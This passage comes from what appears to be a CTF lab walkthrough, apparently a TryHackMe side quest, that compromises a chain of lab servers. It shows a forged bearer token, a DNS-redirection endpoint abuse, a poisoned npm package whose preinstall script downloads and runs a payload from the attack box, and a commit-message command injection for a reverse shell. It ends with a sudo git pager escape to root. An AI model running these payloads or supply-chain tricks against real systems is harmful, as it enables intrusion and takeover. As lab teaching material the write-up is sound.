    "e": "AQAB",
    "use": "sig",
    "kid": "sig-1735516005",
    "alg": "RS256",
    "n": "mb-vNr_IsQ9qEEPKv2EQCwAG-DXhNVV7Gdp0JkaXE5PsK5yR-Fs1DiFwF3PbGR90f7We8bWr1ZypqNE4sRdg9kxWr3N2Wm5UUCbKPbhnHf6SLQkUblrs4WJrC0zt7HAWFgY8YQ2OxI-DWuhGTZOToyv9pvBrIiJyelUlXvpo_STy7lJ-rWbv9KrIAUOWUoUEIqaPS3lwsZxEQTvrBuYrAOMKrSIoBTqfaAWpxn44LQ_BConyHOFCwLDDfmGI6H3tkkrCBTm3aZxEnW80b9F1oPGPDaOGso8_ir2Zj4b9f8vwqKCyw42wQZJBDnZwgaa2LYBYtZ_k4Yi4N1uyfGr_DQ"
}]}
```

the admint service updates its jwks every minute so wait a while, then you can make a curl request with the bearer token, e.g.

```bash
curl -X POST -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1jc2tpZHktYWRtIn0.Af1w1hFuK_tfgwGiMxe_fn_hP6qrYXLU2gG_v8PKT0ir26vkO5MTA3bzAghjfwxJfGCoLu4zg5BSCrffISyuzeB47UTNuiZ3zmkIQ9k_CNjjpW8U_UlfNhhBWSHd0zRQ19mrts9ho-JJyLlfCw8jQ-ELvk-cW0lgfup6GtQVAyObKEYtRGNXrg54L76JiCkqqMDoXCwT9G9DVprjdEIcQ-NI7pTK5Gml-YiqPv3nkQdd9cVWYgYOEGOfTEx0Xfn43a8NoFwP6aFRyyrEvx2kOWtOqFwQP64gX2BKAjeoYEGz0gPwFGESfnr0i4JeXyKyKYK-mdoTqw4jDbHjGxaVqA" 172.16.1.2:3000/restart-service
```

if its working the response should be `{"error":"Missing host or serviceName value."}` (if it didn't work it will return 'forbidden' - ensure you have got all the pieces in place correctly.

#### redirection via dns and npm poisoning

at this point setting the auth token as env var can be useful: `export auth="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1jc2tpZHktYWRtIn0.Af1w1hFuK_tfgwGiMxe_fn_hP6qrYXLU2gG_v8PKT0ir26vkO5MTA3bzAghjfwxJfGCoLu4zg5BSCrffISyuzeB47UTNuiZ3zmkIQ9k_CNjjpW8U_UlfNhhBWSHd0zRQ19mrts9ho-JJyLlfCw8jQ-ELvk-cW0lgfup6GtQVAyObKEYtRGNXrg54L76JiCkqqMDoXCwT9G9DVprjdEIcQ-NI7pTK5Gml-YiqPv3nkQdd9cVWYgYOEGOfTEx0Xfn43a8NoFwP6aFRyyrEvx2kOWtOqFwQP64gX2BKAjeoYEGz0gPwFGESfnr0i4JeXyKyKYK-mdoTqw4jDbHjGxaVqA"`

the three end points each cause the admin service to connect to the target host over ssh, then run commands. modify-resolv for example simply sets the nameserver of server, replacing the content of /etc/resolve.conf. we can run a command like
`curl -X POST -H "Authorization: Bearer $auth" -d "host=172.16.1.3&nameserver=10.10.174.209" 172.16.1.2:3000/modify-resolv`, so 172.16.1.3 uses our attack box as the nameserver (here 10.10.174.209). with dnsmasq or similar we can then redirect requests for urls like the npm registry to where we like.

on the thm attack box, dnsmasq is already installed, so by adding a line like `address=/npm-registry.bestfestivalcompany.thm/10.10.174.209` to `/etc/dnsmasq.conf` and then running `systemctl restart dnsmasq` this can be configured as we need it to be. to confirm, run `dig npm-registry.bestfestivalcompany.thm @127.0.0.1` - it should respond with the ip configured.

> For further intel now, you can view the exact code of the `bfcadmin-remote-manager` package that `admint` is using to power these webservices: this is a private package in the npm-registry, but if on your attack box you run `nc -nvlp 5873` and then trigger a package reinstall via `curl -X POST -H "Authorization: Bearer $auth" -d "host=172.16.1.3&service=bfc_thehubuat" 172.16.1.2:3000/reinstall-node-modules`, you will catch a request with the bearer token the admin service is using at access the registry. with this you can download the info page of the remote manager with: `curl -H "authorization: Bearer OWI1MmY3MzA0MDEyZmVkYTIwMzdjMTZmZDhjZjA1ZmQ6OGJiNjQxM2Y0NDYzZDZiMGRiMWI2NGY2ZjhkOWU2OWJlNTk0M2VkNzg5OTU5NDM2NjkyMDdm" http://172.16.1.2:4873/bfcadmin-remote-manager`, which has the path for the tar ball. This auth token contains encrypted credentials and is otherwise not useful (afaik)

To get onto 172.16.1.2, where admint/admdev and the root.key that they use is located, we want to hijack them via a pre install script. This can be done a few ways, but a simple rag tag way is to jimmy up a malicious package and then host it behind a webserver:

1. create a folder for our 'registry'
2. in that folder, create another folder for our package. the first package looked for is express, so create a folder named express
3. in the express folder, create an index.html file with the following content:

```json
{
  "name": "express",
  "versions": {
    "4.21.2": {
      "name": "express",
      "version": "4.21.2",
      "description": "",
      "main": "exploit.js",
      "author": {
        "name": "crashoverride"
      },
      "_id": "express@4.21.2",
      "_nodeVersion": "20.15.1",
      "_npmVersion": "10.9.2",
      "dist": {
        "integrity": "sha512-GP2zfi7iB3aqbUHeYFUS/pFkbYJpFjnCqRyStXI7RO1OQ84STcqpA4T5nyUzrpbX6c9EwSjuuMU9KmVfnc0Vow==",
        "shasum": "421c6123a46722141b9326fa52172ed4be83808c",
        "tarball": "http://npm-registry.bestfestivalcompany.thm:4873/express/express-4.21.2.tgz"
      },
      "contributors": []
    }
  },
  "time": {
    "modified": "2024-12-18T20:41:51.401Z",
    "created": "2024-12-18T20:41:51.401Z",
    "1.0.0": "2024-12-18T20:41:51.401Z"
  },
  "users": {},
  "dist-tags": {
    "latest": "4.21.2"
  },
  "_rev": "3-5fb81ed78fa0dd09",
  "_id": "express",
  "readme": "ERROR: No README data found!",
  "_attachments": {}
}
```

4. create a package folder.
5. place in the package folder a malicious post install script, like this `exploit.js`:

```javascript
const { exec } = require('child_process');
exec('tempfile=$(mktemp) && wget 10.10.174.209:4444/c -O $tempfile && chmod 777 $tempfile && $tempfile');
```

6. next to this, place a `package.json` that will run this script:

```json
{
  "name": "express",
  "version": "4.21.2",
  "scripts": {
    "preinstall": "node exploit.js"
  },
  "main": "exploit.js",
  "keywords": [],
  "author": "",
  "license": "ISC",
  "description": ""
}
```

7. use `npm pack` to create a the tgz file (or `tar -czf express-4.21.2.tgz package` from outside the package folder if you dont have npm installed)
8. calculate the sha1sum and sha512 integrity hashes: `sha1sum express-4.21.2.tgz` (npm pack will give you this already) and `openssl dgst -sha512 -binary express-4.21.2.tgz | openssl base64 -A`
9. update index.html with these hash values, and the path to your tarball if changed

the final folder structure should be like

```
WEBSERVER ROOT
| express/
    | index.html
    | express-4.21.2.tgz
```

10. start a webserver on port 4873 in the 'registry' root
11. update the nameserver for 172.16.1.2 with `curl -X POST -H "Authorization: Bearer $auth" -d "host=172.16.1.2&nameserver=10.10.174.209" 172.16.1.2:3000/modify-resolv`
12. finally run reinstall node command: `curl -X POST -H "Authorization: Bearer $auth" -d "host=172.16.1.2&service=admdev" 172.16.1.2:3000/reinstall-node-modules`

all going well you will now have a shell as root on 172.16.1.2. 

note that if you look at the webserver logs or especially the npm logs (if you have access) you will see a lot of failures around things like checking for audit info, looking up advisories etc (as our webserver provides none of this) - this doesn't effect the exploit. If you are having trouble, use 172.16.1.3 and the bfc uat site as a test, as this will affect the machine you have compromised - npm is installed and you can run npm install locally to see whats what.

#### git hooks to final server 

with the key used by admint, `/app/admint/root.key` you can enumerate the 172.16.1.1 git server again and will find you have RW on admdev:

```bash
9aa12a31f86c:/app/admint# ssh -i root.key git@172.16.1.1
PTY allocation request failed on channel 0
hello developer, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R W    admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      gitolite-admin
 R      hooks_wip
 R      underconstruction
Connection to 172.16.1.1 closed.
```

hooks_wip also looks interesting. by cloning it with `proxychains git clone git@172.16.1.1:hooks_wip` (after setting the git ssh command to use the root key) it contains a post-receive hook template that we can assume is used for the other repos:

```bash
#!/bin/bash

LOGFILE="/home/git/gitolite-commit-messages.log"

while read oldrev newrev refname; do
    if [ "$newrev" != "0000000000000000000000000000000000000000" ]; then
        # Get the commit message
        commit_message=$(git --git-dir="$PWD" log -1 --format=%s "$newrev")
        bash -c "echo $(date) - Ref: $refname - Commit: $commit_message >> $LOGFILE"
    else
        # Log branch deletion
        bash -c "echo $(date) - Ref: $refname - Branch deleted >> $LOGFILE"
    fi
done
```

basically commit messages are echoed into a log file, and this is trivially exploitable via os injection in the message content.

1. create a commit like `git commit -m '$(wget 10.10.174.209:4444/c -O /tmp/c && chmod 777 /tmp/c && /tmp/c)'` - the message contains our os injection payload
2. execute by pushing to the remote server: `proxychains git push`

this should get a shell as `git` on the final machine

#### root

comparatively easy compared to the rest:

1. `sudo -l` lists `(ALL) NOPASSWD: /usr/bin/git --no-pager diff *`
2. regardless of the nopager argument, `sudo /usr/bin/git --no-pager diff --help` will load in a pager.
3. typing `!sh` will then spawn a root shell.

and you're all done! possibly the windiest of the side quests, though it took a lot less time than the mammoth sq3 heap thing
